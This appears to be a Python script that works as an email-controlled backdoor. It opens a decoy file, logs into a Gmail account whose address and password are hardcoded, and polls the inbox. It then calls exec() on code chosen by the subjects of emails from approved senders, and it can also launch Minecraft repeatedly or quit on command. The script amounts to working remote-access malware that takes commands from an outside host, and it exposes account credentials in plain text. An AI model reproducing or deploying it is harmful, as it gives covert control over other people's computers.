print('LOADING...')
import smtplib
import time
import imaplib
import email
import sys
import os
import time
import hashlib
from random import randint
from subprocess import check_output
from stringco import *
import pyautogui
#from pynput.keyboard import Key, Controller

def hashh(s):
    return hashlib.md5(s.encode()).digest()

print(hashh('NOPEFISH'), sep="\n")

exec(open('keys.txt', 'r').read())

class actions:
    coms = []
    execs = []
    def __init__(self, fname):
        file = openS(fname, 'r')
        inp = ''
        is_code = False
        code_part = ''
        while True:
            inp = file.readline()
            if inp == ';':
                break
            elif inp == '>$\n':
                self.execs.append(code_part)
                code_part = ''
                is_code = False
            elif inp == '$<\n':
                is_code = True
            else:
                if is_code:
                    code_part = code_part + inp
                else:
                    self.coms.append(inp[:-1])
        print(self.coms)
        print(self.execs)
    def find(self, st):
        s = st.split()[0]
        i = strco.Dam(self.coms, s)
        return self.execs[i]
    def findO(self, st):
        s = st.split()[0]
        for i in range(len(self.coms)):
            print(self.coms, self.coms[i], s)
            if self.coms[i] == s:
                #print(execs[i])
                return self.execs[i]

def openS(fname, mode):
    try:
        file = open(fname, mode)
    except:
        _=0
        #file = open('../HDBlond/' + fname, mode)
    return file

f_path = openS('path_to_false_file.txt', 'r')
acts = actions('actions.txt')
os.startfile(f_path.read())

ORG_EMAIL   = "@gmail.com"
FROM_EMAIL  = "proect.board.22" + ORG_EMAIL
FROM_PWD    = "q1w2e3r4t5y6u7i8o9p0[-]="
SMTP_SERVER = "imap.gmail.com"
SMTP_PORT   = 993

out = openS('output.txt', 'w')
try:
    file = openS('last_ind.txt', 'r')
except:
    file = openS('last_ind.txt', 'w')
    file.write('0')
    file.close()
    file = openS('last_ind.txt', 'r')
last_ind = int(file.readline())
file.close()

mail = imaplib.IMAP4_SSL(SMTP_SERVER)
mail.login(FROM_EMAIL,FROM_PWD)

def read_email_from_gmail():
    global last_ind, mail
    mail.select('inbox')

    typee, data = mail.search(None, 'ALL')
    mail_ids = data[0]

    id_list = mail_ids.split()
    first_email_id = int(id_list[0])
    latest_email_id = int(id_list[-1])

    if last_ind != len(id_list) - 1:
        for i in id_list[len(id_list) - 1:][::-1]:
            file = openS('last_ind.txt', 'w')
            last_ind = len(id_list) - 1
            file.write(str(last_ind))
            file.close()
            typ, data = mail.fetch(i, '(RFC822)')

            for response_part in data:
                if isinstance(response_part, tuple):
                    if isinstance(response_part[1], bytes):
                        msg = email.message_from_bytes(response_part[1])
                        email_subject = msg['subject']
                        sender = msg['from']
                        print('Got mail from', sender[sender.find('<') + 1:-1])
                        if hashh(sender[sender.find('<') + 1:-1]) in keys:
                            if email_subject == 'MINECRAFTRUN':
                                return -1
                            elif email_subject == 'MINECRAFTFLOW':
                                return -2
                            elif email_subject == 'STOP':
                                quit()
                            else:
                                subject = email_subject
                                #print(subject)
                                exec(acts.find(email_subject))
                    else:
                        print('ERR')
    return -100

m_path = openS('path_to_minecraft.txt', 'r')
print('Reading GMAIL', FROM_EMAIL)
print(keys)
print('LOADING...')
while True:
    try:
        res = read_email_from_gmail()
        if res == -1:
            os.startfile(m_path.read())
        if res == -2:
            for i in range(10):
                os.startfile(m_path.read())
    except:
        print('ERROR')
out.close()
